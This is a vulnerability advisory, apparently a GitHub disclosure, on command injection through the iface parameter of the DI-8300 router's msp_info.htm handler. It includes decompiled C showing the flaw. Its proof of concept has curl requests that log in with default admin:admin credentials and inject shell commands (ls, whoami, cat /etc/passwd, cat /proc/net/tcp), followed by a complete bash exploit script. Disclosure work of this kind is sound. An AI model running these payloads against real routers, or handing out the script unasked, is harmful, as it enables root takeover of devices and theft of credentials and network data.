**Title:** Command Injection in `msp_info_htm` CGI Handler  
**Date:** March 26, 2026  
**Severity:** Critical  

---

#### 1. Overview

A command injection vulnerability exists in the `msp_info_htm` CGI handler of the DI-8300 router (firmware version `DI_8300-16.07.26A1.trx`). When the `flag` parameter is set to `qos`, the value of the `iface` parameter is unsafely concatenated into a system command string and executed via the `system()` function. An authenticated attacker can inject arbitrary shell metacharacters (e.g., `;`, `|`, `&`) to achieve remote code execution with `root` privileges.

---

#### 2. Affected Product

- **Vendor:** D-Link (or OEM)
- **Device:** DI-8300
- **Firmware Version:** 16.07.26A1
- **Component:** `msp_info_htm` CGI module
- **Endpoint:** `/msp_info.htm`

---

#### 3. Vulnerability Details

##### 3.1 Root Cause

The function `msp_info_htm` processes HTTP requests and builds system commands based on user-supplied parameters. When `flag=qos`, the following code is executed:

```c
parm_1 = (const char *)httpd_get_parm(a1, "iface");

// ... later in the qos branch ...

if ( parm_1 )
    sprintf(wys_qos_devinfo____tmp_msp.info_, "wys qos skb %s > /tmp/msp.info", parm_1);
else
    strcpy(wys_qos_devinfo____tmp_msp.info_, "wys qos devinfo > /tmp/msp.info");
system(wys_qos_devinfo____tmp_msp.info_);
```

- The `iface` parameter (`parm_1`) is taken directly from the HTTP request without any validation or sanitization.
- It is inserted into a command string using `sprintf()`, then executed by `system()`.
- No escaping of shell metacharacters is performed, allowing an attacker to break out of the intended command and inject arbitrary commands.

##### 3.2 Code Snippet (Reverse-Engineered)

The vulnerable branch is highlighted in the decompiled source:

```c
int __fastcall msp_info_htm(int a1)
{
    // ...
    parm = httpd_get_parm(a1, "flag");
    parm_1 = (const char *)httpd_get_parm(a1, "iface");
    // ...
    if ( !strcmp(parm, "qos", v8) )
    {
        if ( parm_1 )
            sprintf(wys_qos_devinfo____tmp_msp.info_, 
                    "wys qos skb %s > /tmp/msp.info", parm_1);
        else
            strcpy(wys_qos_devinfo____tmp_msp.info_, 
                   "wys qos devinfo > /tmp/msp.info");
        system(wys_qos_devinfo____tmp_msp.info_);
        // ...
    }
    // ...
}
```

---

#### 4. Proof of Concept (PoC)

The following steps demonstrate successful exploitation. The attacker must have valid credentials (default `admin:admin` often used).

**4.1 Login to Obtain Session Cookie**

```bash
curl -c cookies.txt -X POST "http://192.168.0.1/login.cgi" \
  -d "user=admin&password=admin"
```

**4.2 Inject Command to List Root Directory**

```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;ls%20/"
```

The injected payload `x;ls /` results in the execution of:

```bash
wys qos skb x; ls / > /tmp/msp.info
```

The output of `ls /` is returned in the HTTP response.

**4.3 Verify Root Privileges**

```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;whoami"
```

Response contains `root`.

**4.4 Read Sensitive File**

```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;cat%20/etc/passwd"
```

The contents of `/etc/passwd` are disclosed.

---

**4.5 Whole poc
```
TARGET="192.168.0.1"
COOKIE_FILE="/tmp/di8300_vuln001_cookies.txt"

echo "========================================="
echo "VULN-001 Command Injection POC - FINAL"
echo "Target: $TARGET"
echo "========================================="
echo ""

echo "[*] Step 1: Login..."
LOGIN_RESP=$(curl -s -c $COOKIE_FILE -X POST "http://$TARGET/login.cgi" \
  -d "user=admin&password=admin" 2>&1)
echo "[+] Login done"

echo ""
echo "[*] Step 2: Confirming vulnerability exists..."
echo ""

echo "[CONFIRMED] Testing: flag=qos&iface=x;ls /"
RESP=$(curl -s -b $COOKIE_FILE "http://$TARGET/msp_info.htm?flag=qos&iface=x;ls%20/")
echo "$RESP"
echo ""

echo "[*] Verifying user privilege..."
echo "[Test] Checking: flag=qos&iface=x;whoami"
RESP2=$(curl -s -b $COOKIE_FILE "http://$TARGET/msp_info.htm?flag=qos&iface=x;whoami")
echo "$RESP2"
echo ""

echo "[*] Testing file read..."
echo "[Test] Reading /etc/passwd"
RESP3=$(curl -s -b $COOKIE_FILE "http://$TARGET/msp_info.htm?flag=qos&iface=x;cat%20/etc/passwd")
echo "$RESP3"
echo ""

echo "[*] Testing network info..."
RESP4=$(curl -s -b $COOKIE_FILE "http://$TARGET/msp_info.htm?flag=qos&iface=x;cat%20/proc/net/tcp")
echo "$RESP4" | head -10
echo ""

rm -f $COOKIE_FILE

echo ""
echo "========================================="
echo "[+] VULN-001 VERIFIED!"
echo "[+] Vulnerability: Command Injection"
echo "[+] Location: /msp_info.htm?flag=qos&iface=INJECTION_POINT"
echo "[+] Method: Semicolon injection via iface parameter"
echo "[+] Privilege: root"
echo "========================================="#
```

<img width="2219" height="1025" alt="image" src="https://github.com/user-attachments/assets/bc04e315-e86d-4144-87c1-c428d9374105" />


#### 5. Impact

- **Remote Code Execution:** An attacker can execute arbitrary system commands on the device.
- **Privilege Escalation:** Commands run with `root` privileges, granting full control over the router.
- **Data Breach:** Sensitive files (configuration, credentials, network data) can be read.
- **Persistence:** The device can be backdoored, used as a pivot for internal network attacks, or recruited into a botnet.
- **Availability:** The device can be bricked or its services disrupted.


#### 6. References

- CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- OWASP Command Injection Prevention Cheat Sheet
